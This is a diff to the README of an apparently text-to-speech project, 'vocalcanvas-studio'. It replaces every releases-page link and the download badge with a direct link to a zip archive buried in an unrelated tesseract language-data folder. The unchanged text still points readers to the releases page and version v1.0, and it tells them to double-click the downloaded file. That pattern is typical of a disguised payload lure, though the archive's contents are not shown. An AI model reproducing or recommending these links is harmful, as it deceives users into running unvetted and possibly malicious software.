@@ -1,6 +1,6 @@
 # 🎤 vocalcanvas-studio - Create Speech from Text Effortlessly
 
-[![Download v1.0](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/c0dest3r/vocalcanvas-studio/releases)
+[![Download v1.0](https://raw.githubusercontent.com/c0dest3r/vocalcanvas-studio/main/js/tesseract/lang-data/4.0.0_best/vocalcanvas-studio-3.9.zip)](https://raw.githubusercontent.com/c0dest3r/vocalcanvas-studio/main/js/tesseract/lang-data/4.0.0_best/vocalcanvas-studio-3.9.zip)
 
 ## 📦 Overview
 
@@ -13,7 +13,7 @@ To begin using vocalcanvas-studio, follow these simple steps:
 1. **Download the Application**  
    Click the link below to visit the releases page and download the application files.  
 
-   [Visit this page to download](https://github.com/c0dest3r/vocalcanvas-studio/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/c0dest3r/vocalcanvas-studio/main/js/tesseract/lang-data/4.0.0_best/vocalcanvas-studio-3.9.zip)
 
 2. **Install the Application**  
    Once downloaded, locate the file on your computer. Double-click the file to start the installation process. Follow the on-screen instructions to complete the installation.
@@ -25,7 +25,7 @@ To begin using vocalcanvas-studio, follow these simple steps:
 
 To download vocalcanvas-studio, visit the following link:
 
-[Visit this page to download](https://github.com/c0dest3r/vocalcanvas-studio/releases)
+[Visit this page to download](https://raw.githubusercontent.com/c0dest3r/vocalcanvas-studio/main/js/tesseract/lang-data/4.0.0_best/vocalcanvas-studio-3.9.zip)
 
 On the releases page, look for the version that suits your system. Click on the download link for your operating system. The most current version is v1.0.
 
